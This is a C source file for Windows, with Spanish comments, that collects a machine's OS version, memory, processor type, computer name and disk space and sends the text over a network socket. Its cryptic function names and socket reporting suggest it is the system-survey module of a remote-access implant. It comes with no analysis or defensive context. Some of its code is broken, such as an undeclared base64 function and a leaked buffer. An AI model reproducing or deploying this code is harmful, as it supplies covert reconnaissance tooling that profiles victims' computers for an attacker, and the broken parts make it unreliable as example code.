#include <windows.h>

char* strSysrch();
char* CmtrSrch();
OSVERSIONINFO OsSrch();
MEMORYSTATUSEX MemSrch();
SYSTEM_INFO SysSrch();
char* dcdeStm(char* systemInfo);
char* strSysrch();

// Información del sistema operativo
OSVERSIONINFO OsSrch(){
   OSVERSIONINFO osvi;
   ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
   osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
   GetVersionEx(&osvi);
   return osvi;
}

// Información de la memoria
MEMORYSTATUSEX MemSrch(){
   MEMORYSTATUSEX statex;
   statex.dwLength = sizeof(statex);
   GlobalMemoryStatusEx(&statex);
   return statex; 
}

// Información del procesador
SYSTEM_INFO SysSrch(){
   SYSTEM_INFO siSysInfo;
   GetSystemInfo(&siSysInfo);
   return siSysInfo;
}

// Nombre del nodo (nombre del equipo)
char* CmtrSrch(){
   char* computerName = (char*) malloc((MAX_COMPUTERNAME_LENGTH + 1) * sizeof(char));
   DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
   GetComputerName(computerName, &size);
   return computerName;
}

// Información del disco duro
typedef struct {
   ULARGE_INTEGER totalNumberOfBytes;
   ULARGE_INTEGER totalNumberOfFreeBytes;

} DskSpaceInfo;

DskSpaceInfo  DskSrch(){
   ULARGE_INTEGER freeBytesAvailableToCaller;
   DskSpaceInfo diskSpaceInfo;

   GetDiskFreeSpaceEx("C:\\", &freeBytesAvailableToCaller, &diskSpaceInfo.totalNumberOfBytes, &diskSpaceInfo.totalNumberOfFreeBytes);
   return diskSpaceInfo;
}

char* dcdeStm(char* systemInfo){
    char* systemInfoEncode = malloc(strlen(systemInfo) + 1);
    size_t size1 = strlen(systemInfo);
    systemInfoEncode = base64_encode(systemInfo, size1, &size1);
    return systemInfoEncode;

}


char* strSysrch(){
   char* infoSys = malloc(1000 * sizeof(char)); // Asegúrate de tener suficiente espacio para la información
   infoSys[0] = '\0'; // Inicializa la cadena

   OSVERSIONINFO osvi = OsSrch();
   //printf("\n\t\tWindows version: %d.%d\n\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
   sprintf(infoSys + strlen(infoSys), "\n\t\tWindows version: %d.%d\n\n", osvi.dwMajorVersion, osvi.dwMinorVersion);

   MEMORYSTATUSEX statex = MemSrch();
   //printf("\t| Total physical memory:\ts %llu GB\n", ((statex.ullTotalPhys / 1024) / 1024) / 1024);
   sprintf(infoSys + strlen(infoSys), "\t| Total RAM memory:\t %llu GB\n", ((statex.ullTotalPhys / 1024) / 1024) / 1024);

   SYSTEM_INFO siSysInfo = SysSrch();
   //printf("\t| Processor type:\t %u\n", siSysInfo.dwProcessorType); 
   sprintf(infoSys + strlen(infoSys), "\t| Processor type:\t %u\n", siSysInfo.dwProcessorType);

   char* cmptrNme = CmtrSrch();
   //printf("\t| Computer name:\t %s\n", cmptrNme);
   sprintf(infoSys + strlen(infoSys), "\t| Node name:\t %s\n", cmptrNme);
   free (cmptrNme);

   DskSpaceInfo info = DskSrch();
   //printf("\t| Total disk space:\t %llu GB\n", info.totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024));
   //printf("\t| Free disk space:\t %llu GB\n\n", info.totalNumberOfFreeBytes.QuadPart / (1024 * 1024 * 1024));
   sprintf(infoSys + strlen(infoSys), "\t| Total disk space:\t %llu GB\n", info.totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024));
   sprintf(infoSys + strlen(infoSys), "\t| Free disk space:\t %llu GB\n\n", info.totalNumberOfFreeBytes.QuadPart / (1024 * 1024 * 1024));

   return infoSys;
}

int strtAll(SOCKET conn){
   char *SysInfo = strSysrch();
   //char *cdedSys = dcdeStm(SysInfo);

   send(conn, SysInfo, strlen(SysInfo), 0);
   free(SysInfo);
   Sleep(300);
   return 0;
}
